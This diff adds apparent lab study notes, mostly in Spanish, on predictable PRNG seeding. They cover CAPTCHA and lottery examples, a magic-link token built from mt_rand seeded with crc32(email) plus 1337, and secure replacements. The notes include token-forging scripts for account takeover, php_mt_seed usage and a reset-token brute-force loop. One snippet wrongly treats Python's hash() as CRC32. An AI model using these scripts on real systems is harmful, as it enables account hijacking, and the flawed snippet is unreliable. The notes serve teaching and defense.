@@ -509,3 +509,595 @@ The script attempts to guess a password recovery token based on the assumption t
 
 # Predictable seed in PRNGs 
 
+## Predictable Seeds en PRNGs – Resumen con Ejemplos
+### Concepto central
+
+Cuando un PRNG se inicializa con una semilla predecible, toda la secuencia de números "aleatorios" puede ser reproducida por un atacante. La seguridad del sistema colapsa completamente — no importa cuán complejo sea el algoritmo, si la semilla es débil, la salida es predecible.
+
+## Impacto en distintos sistemas
+
+1. CAPTCHA bypass
+
+```
+Servidor genera CAPTCHA:
+  mt_srand(timestamp)        ← semilla predecible
+  $challenge = mt_rand()     ← atacante puede calcular este valor
+
+Atacante:
+  1. Observa el timestamp del request
+  2. Replica mt_srand(timestamp) localmente
+  3. Calcula mt_rand() → obtiene el valor del CAPTCHA antes de verlo
+  4. Envía respuesta correcta automáticamente → bot pasa como humano
+  ```
+
+  ### 2. Lotería / juegos de azar
+
+  ```
+import random
+
+# Servidor vulnerable
+random.seed(int(time.time()))      # timestamp como semilla
+winning_number = random.randint(1, 100)
+
+# Atacante: conoce el momento del sorteo (público)
+random.seed(known_timestamp)
+predicted = random.randint(1, 100)  # mismo resultado garantizado
+```
+### Escenario práctico: ```Magic Link con mt_rand()```
+
+Cómo se genera el token vulnerable:
+
+```php
+// Servidor PHP — generación del magic link
+$email = "victim@example.com";
+$constant = 12345;  // constante fija en el código
+
+// Semilla = CRC32 del email + constante predecible
+$seed = crc32($email) + $constant;
+mt_srand($seed);
+
+$token = mt_rand();
+$magic_link = "http://random.thm:8090/case/login.php?token=" . $token;
+```
+
+### Por qué es explotable:
+
+```
+CRC32("victim@example.com") → valor FIJO y determinista
+         +
+Constante hardcodeada → también fija
+         =
+Semilla SIEMPRE IGUAL para el mismo email
+         ↓
+mt_rand() produce SIEMPRE el mismo token
+```
+
+## Ataque de reverse-engineering
+
+```python
+import ctypes
+
+# El atacante replica la lógica del servidor
+email = "victim@example.com"
+constant = 12345
+
+# CRC32 en Python equivalente al de PHP
+seed = ctypes.c_int32(hash(email) & 0xFFFFFFFF).value + constant
+
+# Replica mt_srand + mt_rand localmente
+# → obtiene el token sin necesidad de recibirlo
+```
+
+### Comparación: vulnerable vs seguro
+
+```php
+// VULNERABLE — semilla determinista
+$seed = crc32($email) + $constant;
+mt_srand($seed);
+$token = mt_rand();
+// Mismo email → mismo token → siempre predecible
+
+// SEGURO — entropía real del sistema operativo
+$token = bin2hex(random_bytes(32));
+// 256 bits de entropía real, nunca reproducible
+```
+
+### Cadena de explotación completa
+
+```
+1. Atacante conoce el email del objetivo (público o enumerado)
+         ↓
+2. Calcula CRC32(email) + constante → semilla
+         ↓
+3. Replica mt_srand(seed) + mt_rand() localmente
+         ↓
+4. Obtiene el token del magic link sin solicitarlo
+         ↓
+5. Accede directamente a la URL con el token predicho
+         ↓
+6. Account takeover completado
+```
+### Lección clave
+
+Una semilla predecible convierte cualquier PRNG — incluso uno estadísticamente robusto como Mersenne Twister — en un generador completamente determinista y explotable. CRC32 de un email no es entropía: es una transformación matemática de datos conocidos. Sumar una constante fija no añade aleatoriedad. El resultado es un token que parece aleatorio pero que cualquier atacante con acceso al código fuente (o que pueda deducir la lógica) puede calcular exactamente.
+
+
+## Análisis del Magic Link Feature
+
+### Flujo completo del sistema
+
+```
+Usuario ingresa email
+        ↓
+Servidor genera token:
+  seed = CONSTANT_VALUE + crc32($email)
+  mt_srand(seed)
+  $token = base64_encode(mt_rand())
+        ↓
+Token enviado por email como magic link
+        ↓
+Usuario hace click → autenticado sin contraseña
+```
+ ### Anatomía del token
+El token ```MTEzNTUwODU0MQ==``` se descompone así:
+
+```python 
+import base64
+
+token = "MTEzNTUwODU0MQ=="
+
+# Paso 1: decodificar base64
+decoded = base64.b64decode(token).decode()
+print(decoded)  # → "1135508541"
+
+# Ese número es exactamente lo que devolvió mt_rand()
+# con la semilla: CONSTANT_VALUE + crc32("magic@mail.random.thm")
+```
+
+## Por qué es completamente predecible
+### El problema de la semilla
+
+```php
+// Código del servidor
+mt_srand(CONSTANT_VALUE + crc32($email));
+$random_number = mt_rand();
+$token = base64_encode($random_number);
+```
+
+### Cada componente de la semilla es conocido o calculable:
+
+
+| Componente | Valor | ¿Secreto? |
+| :--- | :--- | :--- |
+| **CONSTANT_VALUE** | Fijo en el código | No — visible en source o deducible |
+| **crc32($email)** | Función determinista del email | No — el email es conocido |
+| **Semilla resultante** | Siempre igual para el mismo email | No |
+
+## Reproducción del ataque
+
+```python
+import base64
+import ctypes
+
+# Datos conocidos por el atacante
+email = "victim@mail.random.thm"
+CONSTANT_VALUE = 12345  # deducido del código fuente
+
+# Paso 1: calcular CRC32 del email (equivalente al de PHP)
+import binascii
+crc = binascii.crc32(email.encode()) & 0xFFFFFFFF
+crc_signed = ctypes.c_int32(crc).value
+
+# Paso 2: calcular la semilla exacta
+seed = CONSTANT_VALUE + crc_signed
+
+# Paso 3: PHP mt_rand con esa semilla produce un valor determinista
+# → el atacante puede usar una tool como php-mt-seed o llamar PHP directamente
+# php -r "mt_srand($seed); echo mt_rand();"
+
+# Paso 4: codificar en base64
+predicted_number = 1135508541  # resultado de mt_rand con esa semilla
+predicted_token = base64.b64encode(str(predicted_number).encode()).decode()
+print(predicted_token)  # → "MTEzNTUwODU0MQ=="
+
+# Paso 5: construir el magic link
+magic_link = f"http://random.thm:8090/case/magic_link_login.php?token={predicted_token}"
+print(magic_link)  # → acceso directo sin conocer la contraseña
+```
+## Debilidades encadenadas
+
+```
+Debilidad 1: mt_rand() no es criptográficamente seguro
+        +
+Debilidad 2: semilla = datos públicos (email + constante)
+        +
+Debilidad 3: base64 no es cifrado, solo encoding
+        =
+Token 100% predecible para cualquier email conocido
+```
+Base64 es frecuentemente confundido con cifrado — no lo es. Solo cambia la representación del dato, no lo protege. Decodificarlo toma milisegundos.
+
+## La corrección adecuada
+
+```php
+// VULNERABLE — actual
+mt_srand(CONSTANT_VALUE + crc32($email));
+$token = base64_encode(mt_rand());
+
+// SEGURO — corrección
+$token = bin2hex(random_bytes(32));
+// - random_bytes() usa CSPRNG del SO
+// - 256 bits de entropía real
+// - No hay semilla, no hay patrón, no hay predicción posible
+```
+## Lección clave
+
+Este escenario ilustra cómo tres decisiones de diseño incorrectas se combinan para crear una vulnerabilidad crítica: usar ```mt_rand()``` en lugar de un CSPRNG, construir la semilla con datos públicos, y confundir base64 con seguridad. Ninguna capa individual parece obviamente rota, pero el resultado es un sistema de autenticación sin contraseña que cualquier atacante puede bypassear calculando el token matemáticamente, sin interceptar ningún email
+
+# Decodificación y Explotación del Token – Resumen con EjemplosPaso 1: 
+## Decodificar el token Base64
+
+```python 
+import base64
+
+token = "MTEzNTUwODU0MQ=="
+
+# Base64 es solo encoding, no cifrado — se revierte trivialmente
+decoded = base64.b64decode(token).decode()
+print(decoded)  # → 1135508541
+
+# Este número es el output DIRECTO de mt_rand()
+```
+## Paso 2: Recuperar la semilla con 
+```php_mt_seed```
+```php_mt_seed``` es una herramienta que recorre todas las semillas posibles (2³² valores) y encuentra cuál produce el número observado.
+
+```bash
+# Se le pasa el output de mt_rand() como argumento
+./php_mt_seed 1135508541
+```
+## Output del tool:
+
+```
+seed = 0x318ff649 = 831518281   (PHP 7.1.0+)
+seed = 0x39dc3504 = 970732804   (PHP 7.1.0+)  ← semilla correcta
+seed = 0x6d8817a7 = 1837635495  (PHP 7.1.0+)
+seed = 0xbe3249b3 = 3190966707  (PHP 7.1.0+)
+Found 5
+```
+
+El tool devuelve múltiples candidatos porque distintas semillas pueden producir el mismo primer valor de ```mt_rand()```. Cada una debe probarse individualmente. En este caso, la semilla correcta es 970732804.
+
+## Paso 3: Recuperar la constante del servidor
+
+La semilla se construyó así en el servidor:
+
+```
+seed = CONSTANT_VALUE + crc32($email)
+```
+
+Por lo tanto:
+
+```
+CONSTANT_VALUE = seed - crc32($email)
+```
+
+```python
+import binascii, ctypes
+
+seed = 970732804
+email = "magic@mail.random.thm"
+
+# Calcular CRC32 del email (igual que PHP)
+crc = binascii.crc32(email.encode()) & 0xFFFFFFFF
+crc_signed = ctypes.c_int32(crc).value
+
+CONSTANT_VALUE = seed - crc_signed
+print(f"Constante del servidor: {CONSTANT_VALUE}")
+```
+
+## Paso 4: Generar token para cualquier víctima
+
+    - Con la constante recuperada, el atacante puede calcular el token de cualquier usuario conociendo solo su email:
+
+```python
+import base64, binascii, ctypes, subprocess
+
+CONSTANT_VALUE = ???  # recuperado en paso 3
+
+def predict_token(email):
+    crc = binascii.crc32(email.encode()) & 0xFFFFFFFF
+    crc_signed = ctypes.c_int32(crc).value
+    seed = CONSTANT_VALUE + crc_signed
+    
+    # Llamar PHP directamente para replicar mt_rand exacto
+    result = subprocess.run(
+        ['php', '-r', f'mt_srand({seed}); echo mt_rand();'],
+        capture_output=True, text=True
+    )
+    random_number = result.stdout.strip()
+    token = base64.b64encode(random_number.encode()).decode()
+    return token
+
+# Atacante genera token para la víctima sin recibir ningún email
+victim_email = "victim@mail.random.thm"
+token = predict_token(victim_email)
+magic_link = f"http://random.thm:8090/case/magic_link_login.php?token={token}"
+print(magic_link)  # → acceso directo a la cuenta de la víctima
+```
+
+## Cadena completa del ataque
+
+```
+Token capturado del propio email del atacante
+        ↓
+Base64 decode → número mt_rand(): 1135508541
+        ↓
+php_mt_seed → semillas candidatas → seed correcta: 970732804
+        ↓
+seed - crc32(mi_email) → CONSTANT_VALUE recuperada
+        ↓
+Para cualquier víctima:
+  seed = CONSTANT_VALUE + crc32(victim_email)
+  token = base64(mt_rand con esa seed)
+        ↓
+Account takeover sin contraseña ni interceptar emails
+```
+## Por qué ```php_mt_seed``` funciona:
+
+```
+mt_rand() tiene un espacio de semillas de 2³² = ~4 mil millones de valores
+
+A ~58 millones de semillas/segundo:
+  4,000,000,000 / 58,000,000 ≈ 69 segundos
+
+→ Cualquier semilla de mt_rand() puede crackearse
+  en menos de 2 minutos con hardware modesto
+```
+
+## Lección clave
+
+Este ataque demuestra que ```mt_rand()``` no debe usarse en ningún contexto de seguridad. La combinación de: output observable (el token llega al email del atacante), encoding reversible (base64), y seed recuperable en ~5 minutos (php_mt_seed) convierte todo el sistema de autenticación en una fachada. La constante del servidor — aunque parezca un secreto — queda completamente expuesta una vez que el atacante tiene un solo token válido.
+
+# Explotación Final – Constante 1337 y Account Takeover
+
+### Recuperación de la constante
+
+```
+seed identificado:        970732804
+CRC32("magic@mail.random.thm"):  970731467
+                          ---------
+CONSTANT_VALUE:               1337
+```
+Con esta constante, el atacante puede calcular el token de cualquier usuario conociendo solo su email.
+
+## Flujo completo del ataque
+
+```
+1. Atacante solicita magic link con su propio email
+        ↓
+2. Decodifica token → obtiene output de mt_rand()
+        ↓
+3. php_mt_seed recupera la semilla: 970732804
+        ↓
+4. seed - crc32(mi_email) = 1337  ← constante del servidor
+        ↓
+5. Para cualquier víctima:
+   seed = crc32(victim@email.com) + 1337
+   token = base64(mt_rand(seed))
+        ↓
+6. Visita magic link con token predicho → sesión activa
+```
+## Script PHP de explotación
+
+```php
+<?php
+// Uso: magic_link_login.php?email=victim@mail.random.thm&constant=1337
+
+$email    = $_GET['email'];
+$constant = (int)$_GET['constant'];
+$seed     = crc32($email) + $constant;
+
+mt_srand($seed);
+
+for ($i = 0; $i < 10; $i++) {
+    $token = base64_encode(mt_rand());
+    echo "Token $i: $token <br>";
+}
+```
+
+## Equivalente en Python:
+
+```python
+import base64, binascii, ctypes, subprocess
+
+def generate_tokens(email, constant=1337, count=10):
+    crc = binascii.crc32(email.encode()) & 0xFFFFFFFF
+    seed = ctypes.c_int32(crc).value + constant
+
+    tokens = []
+    for i in range(count):
+        result = subprocess.run(
+            ['php', '-r', f'mt_srand({seed}); '
+                          + ''.join([f'mt_rand();' for _ in range(i)])
+                          + 'echo mt_rand();'],
+            capture_output=True, text=True
+        )
+        number = result.stdout.strip()
+        token = base64.b64encode(number.encode()).decode()
+        tokens.append(token)
+    return tokens
+
+# Generar tokens para la víctima
+for i, t in enumerate(generate_tokens("victim@mail.random.thm")):
+    print(f"Token {i+1}: {t}")
+```
+## Resumen de vulnerabilidades encadenadas
+
+## Análisis de Vulnerabilidades
+
+
+| Capa | Problema | Consecuencia |
+| :--- | :--- | :--- |
+| **mt_rand()** | No es CSPRNG | Output reproducible |
+| **Semilla = CRC32 + constante** | Datos públicos + valor fijo | Semilla calculable |
+| **Base64 encoding** | No es cifrado | Token reversible trivialmente |
+| **Constante hardcodeada 1337** | Un solo token la expone | Válida para todos los usuarios |
+
+
+## La corrección
+
+```php
+// VULNERABLE
+$seed = crc32($email) + 1337;
+mt_srand($seed);
+$token = base64_encode(mt_rand());
+
+// SEGURO
+$token = bin2hex(random_bytes(32));
+// Sin semilla, sin constante, sin patrón
+// 256 bits de entropía real del SO
+```
+## Lección clave
+
+Este escenario muestra que una sola constante hardcodeada destruye la seguridad de todo el sistema. Una vez que un atacante obtiene un token propio y aplica ingeniería inversa, la constante 1337 queda expuesta — y con ella, la capacidad de suplantar a cualquier usuario de la plataforma con solo conocer su email.
+
+# Mitigation Measures:
+
+## Best Practices for Insecure Randomness – Pentesters & Developers
+For Pentesters
+1. Identify Weak Randomness in Code
+During code reviews, flag any use of non-cryptographic RNGs in security-sensitive contexts.
+
+```php 
+// Red flags to look for in code reviews
+mt_rand()        // PHP — Mersenne Twister, not cryptographically secure
+rand()           // PHP/C — even weaker, small output range
+Math.random()    // JavaScript — recoverable internal state
+random.random()  // Python — MT19937, unsuitable for security tokens
+java.util.Random // Java — linear congruential, predictable after 2 outputs
+```
+## 2. Reverse-Engineer Predictable Tokens
+Test whether tokens can be reproduced by recovering the seed.
+
+```bash
+# Step 1: decode the token
+echo "MTEzNTUwODU0MQ==" | base64 -d
+# → 1135508541
+
+# Step 2: recover the seed using php_mt_seed
+./php_mt_seed 1135508541
+# → seed = 970732804
+
+# Step 3: subtract CRC32 of known email to expose constant
+# seed(970732804) - crc32("magic@mail.random.thm")(970731467) = 1337
+```
+## 3. Test Token Exhaustion (Brute Force)
+When tokens are time-based or low-entropy, enumerate the entire search space.
+
+```python
+import requests, time
+
+target_url = "http://target.thm/reset_password.php"
+known_time  = int(time.time())
+
+# Only 600 attempts needed for a ±5-minute window
+for i in range(-300, 301):
+    token = f"victim{known_time + i}"
+    r = requests.get(target_url, params={"token": token})
+    if "Invalid" not in r.text:
+        print(f"[+] Valid token found: {token}")
+        break
+```
+
+## For Secure Code Developers
+### 1. Always Use a CSPRNG
+Replace every security-sensitive call to a statistical PRNG with a cryptographically secure equivalent.
+
+```php 
+// PHP — VULNERABLE vs SECURE
+$token = base64_encode(mt_rand());           // BAD
+$token = bin2hex(random_bytes(32));          // GOOD — OS entropy, 256 bits
+$token = bin2hex(openssl_random_pseudo_bytes(32)); // GOOD alternative
+```
+
+```java
+// Java — VULNERABLE vs SECURE
+Random r = new java.util.Random();           // BAD
+SecureRandom sr = new SecureRandom();        // GOOD
+byte[] token = new byte[32];
+sr.nextBytes(token);
+```
+
+```python
+# Python — VULNERABLE vs SECURE
+import random
+token = random.getrandbits(128)              # BAD
+
+import secrets
+token = secrets.token_hex(32)               # GOOD — 256 bits of OS entropy
+```
+
+## 2. Never Use Predictable Seed Values
+
+```php
+// BAD — all of these are guessable or derivable
+mt_srand(time());                            // Unix timestamp
+mt_srand(crc32($email) + 1337);             // public data + hardcoded constant
+mt_srand(getmypid());                        // PID range: 1–32,768
+mt_srand(ip2long($_SERVER['REMOTE_ADDR'])); // IP address is known
+
+// GOOD — no seeding needed; OS provides entropy directly
+$token = bin2hex(random_bytes(32));
+```
+## 3. Regenerate Randomness for Every Critical Operation
+
+```php
+// BAD — reusing the same token across requests
+$_SESSION['reset_token'] = $token_generated_at_startup;
+
+// GOOD — fresh token generated per request, per user
+function generate_reset_token(): string {
+    return bin2hex(random_bytes(32)); // new entropy every call
+}
+
+// Also: expire tokens after single use
+// DELETE FROM tokens WHERE token = ? AND used = 1;
+```
+
+## 4. Use Secure Functions for Cryptographic Key Generation
+
+```php 
+// PHP — secure RSA key generation
+$key = openssl_pkey_new([
+    'private_key_bits' => 2048,
+    'private_key_type' => OPENSSL_KEYTYPE_RSA,
+]);
+// openssl_pkey_new() draws entropy from /dev/urandom internally
+```
+```python 
+# Python — secure key generation
+from cryptography.hazmat.primitives.asymmetric import rsa
+private_key = rsa.generate_private_key(
+    public_exponent=65537,
+    key_size=2048
+)
+# Internally uses os.urandom() — CSPRNG backed by the OS
+```
+
+## Quick Reference: Insecure vs. Secure Implementation
+
+
+| Context | Insecure | Secure |
+| :--- | :--- | :--- |
+| **Session tokens** | `mt_rand()`, `rand()` | `random_bytes(32)` |
+| **Password reset links** | Timestamp-based | `secrets.token_urlsafe(32)` |
+| **Magic links** | CRC32 + constant seed | `bin2hex(random_bytes(32))` |
+| **Cryptographic keys** | `Math.random()` | `SecureRandom`, `openssl_pkey_new()` |
+| **CAPTCHA values** | Predictable PRNG | Cryptographically Secure PRNG |
+
+
+# Key Takeaway
+
+The divide between a vulnerable and a secure implementation is often a single function call. Replacing mt_rand() with random_bytes() costs nothing in development time but eliminates an entire class of attack. For pentesters, the inverse is equally true — if a token can be decoded, its seed recovered, and a constant derived from one sample, every account on the platform is compromised with nothing more than the target's email address.
+
